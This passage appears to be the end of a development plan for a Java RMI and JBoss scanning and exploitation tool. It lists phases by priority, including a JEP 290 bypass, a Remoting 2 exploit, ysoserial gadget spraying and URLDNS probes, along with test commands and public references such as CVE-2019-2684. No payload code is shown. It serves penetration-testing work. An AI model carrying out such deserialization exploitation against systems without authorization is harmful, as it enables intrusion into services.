   - Required: JDK 8+ on `PATH`

**Tests:** `tests/test_cli.py` — verify `--ysoserial-check` output parsing.

---

## Implementation order

| Priority | Phase | Effort | Impact |
|----------|-------|--------|--------|
| High | E.1 (ObjID fix) | 30 min | Correctness |
| High | E.2 (lookup + stub) | 3h | Enumeration depth |
| High | G.1 (HTTPS) | 1h | Real-world coverage |
| High | G.2 (EAP fingerprint) | 1h | Reporting accuracy |
| Medium | E.3 (parser fix) | 1h | Robustness |
| Medium | G.3 (auth detection) | 1h | Reporting accuracy |
| Medium | G.5 (JNP scanner) | 2h | Attack surface |
| Medium | E.4 (method guessing) | 3h | Enumeration depth |
| Medium | G.4 (Remoting 2 exploit) | 3h | Exploitation |
| Low | F (JEP 290 bypass) | 4h | Advanced exploitation |
| Low | G.6 (Remoting 3) | 2h | Detection only |
| Low | H (Maven bridge) | 2h | Infrastructure |
| High | I.1 (ysoserial exploit modes) | 2h | Exploitation robustness |
| High | I.2 (payload caching) | 30 min | Performance |
| High | I.3 (JRMPClient gadget) | 1h | Phase F prerequisite |
| Medium | I.4 (multi-gadget spray) | 2h | Usability |
| Medium | I.6 (URLDNS probe) | 1h | Detection coverage |
| Low | I.5 (fork support) | 1h | Compatibility |
| Low | I.7 (CLI + docs) | 1h | Usability |

---

## Running tests after each phase

```bash
.venv/bin/pytest tests/ --ignore=tests/integration -q
```

Live integration tests (real target required):
```bash
RMI_HOST=<ip>    RMI_PORT=1099  .venv/bin/pytest tests/integration/ -m live -k rmi
JBOSS_HOST=<ip>  JBOSS_PORT=8080 .venv/bin/pytest tests/integration/ -m live -k jboss
```

---

## Key references

| Topic | Reference |
|-------|-----------|
| JRMP wire format | JDK source: `sun.rmi.transport.tcp.TCPTransport` |
| ObjID encoding | JDK source: `java.rmi.server.ObjID` |
| Method hash computation | JDK source: `sun.rmi.server.UnicastServerRef` |
| CVE-2019-2684 | An Trinh at Black Hat USA 2019; ysoserial `JRMPClient` |
| JEP 290 | JDK Enhancement Proposal 290 (openjdk.org) |
| JBoss HTTP Invoker | Foxglove Security — "What Do WebLogic, WebSphere, JBoss..." |
| JBoss Remoting 2 | JBoss Remoting 2.x documentation |
| JNP protocol | JBoss AS 5 source: `org.jnp.server` |
| Remote Method Guesser | `https://github.com/qtc-de/remote-method-guesser` |
| ysoserial | `https://github.com/frohoff/ysoserial` |
| ysoserial-modified | `https://github.com/pimps/ysoserial-modified` |
| marshalsec | `https://github.com/mbechler/marshalsec` |
| ysoserial JRMPListener | `ysoserial.exploit.JRMPListener` (built-in exploit mode) |
| ysoserial JRMPClient gadget | Deserializes into outbound JRMP connection (UnicastRef) |
